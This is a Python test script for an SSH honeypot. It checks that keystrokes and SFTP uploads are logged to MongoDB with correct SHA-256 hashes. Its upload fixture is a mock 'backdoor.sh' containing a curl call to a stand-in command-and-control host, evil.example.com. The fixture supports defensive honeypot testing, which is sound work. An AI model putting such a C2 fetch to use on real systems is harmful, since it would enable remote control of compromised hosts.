import asyncio
import base64
import os
import sys
import time

import motor.motor_asyncio
import paramiko

PROXY_HOST = os.getenv("PROXY_LISTEN_HOST", "127.0.0.1")
PROXY_PORT = int(os.getenv("PROXY_LISTEN_PORT", "2222"))
MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017")
MONGO_DB = os.getenv("MONGO_DB", "honeyshell")

TEST_USER = "root"
TEST_PASS = "phase3_test_password"
_SETTLE_S = 2.0


def _make_client() -> paramiko.SSHClient:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        hostname=PROXY_HOST,
        port=PROXY_PORT,
        username=TEST_USER,
        password=TEST_PASS,
        timeout=10,
        banner_timeout=10,
        allow_agent=False,
        look_for_keys=False,
    )
    return ssh


async def _get_session() -> dict | None:
    client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
    doc = await client[MONGO_DB].sessions.find_one(
        {"username": TEST_USER, "password": TEST_PASS},
        sort=[("started_at", -1)],
    )
    client.close()
    return doc


async def _get_keystrokes(session_id: str) -> list:
    client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
    docs = await client[MONGO_DB].keystrokes.find(
        {"session_id": session_id}
    ).to_list(length=1000)
    client.close()
    return docs


async def _get_upload(session_id: str, filename: str) -> dict | None:
    client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
    doc = await client[MONGO_DB].uploads.find_one(
        {"session_id": session_id, "filename": filename},
        sort=[("uploaded_at", -1)],
    )
    client.close()
    return doc


def test_keystroke_logging() -> None:
    print(f"\n[*] Testing TTY keystroke logging")

    ssh = _make_client()
    try:
        _, stdout, _ = ssh.exec_command("echo honeypot_test_marker", timeout=10)
        stdout.read()
    finally:
        ssh.close()

    time.sleep(_SETTLE_S)

    session = asyncio.run(_get_session())
    assert session, "Session not found in MongoDB"

    keystrokes = asyncio.run(_get_keystrokes(session["session_id"]))
    assert len(keystrokes) > 0, "No keystrokes recorded"

    directions = {k["direction"] for k in keystrokes}
    assert "input" in directions, "No input keystrokes recorded"
    assert "output" in directions, "No output keystrokes recorded"

    all_output = b"".join(base64.b64decode(k["data"]) for k in keystrokes if k["direction"] == "output")
    assert b"honeypot_test_marker" in all_output, "Command output not captured in keystrokes"

    print(f"[+] PASS — {len(keystrokes)} keystroke chunks recorded")
    print(f"    session_id : {session['session_id']}")
    print(f"    directions : {directions}")


def test_sftp_upload_capture() -> None:
    print(f"\n[*] Testing SFTP file upload capture")

    file_content = b"#!/bin/bash\necho 'This is a captured malware sample'\ncurl http://evil.example.com/c2\n"
    filename = "backdoor.sh"

    ssh = _make_client()
    try:
        sftp = ssh.open_sftp()
        with sftp.open(filename, "w") as f:
            f.write(file_content.decode())
        sftp.close()
    finally:
        ssh.close()

    time.sleep(_SETTLE_S)

    session = asyncio.run(_get_session())
    assert session, "Session not found in MongoDB"

    upload = asyncio.run(_get_upload(session["session_id"], filename))
    assert upload is not None, f"Upload {filename!r} not found in MongoDB"
    assert upload["size_bytes"] == len(file_content), f"Size mismatch: {upload['size_bytes']} != {len(file_content)}"
    assert upload["content_hash"], "SHA-256 hash missing"
    assert upload["file_ref"] is not None, "GridFS file_ref missing"

    import hashlib
    expected_hash = hashlib.sha256(file_content).hexdigest()
    assert upload["content_hash"] == expected_hash, f"Hash mismatch: {upload['content_hash']} != {expected_hash}"

    print(f"[+] PASS — upload captured correctly")
    print(f"    filename     : {upload['filename']!r}")
    print(f"    size_bytes   : {upload['size_bytes']}")
    print(f"    sha256       : {upload['content_hash']}")
    print(f"    gridfs_ref   : {upload['file_ref']}")


if __name__ == "__main__":
    try:
        test_keystroke_logging()
        test_sftp_upload_capture()
        print("\n[+] All Phase 3 tests passed.")
    except AssertionError as exc:
        print(f"\n[-] FAIL: {exc}", file=sys.stderr)
        sys.exit(1)
    except Exception as exc:
        print(f"\n[-] ERROR: {exc}", file=sys.stderr)
        sys.exit(2)
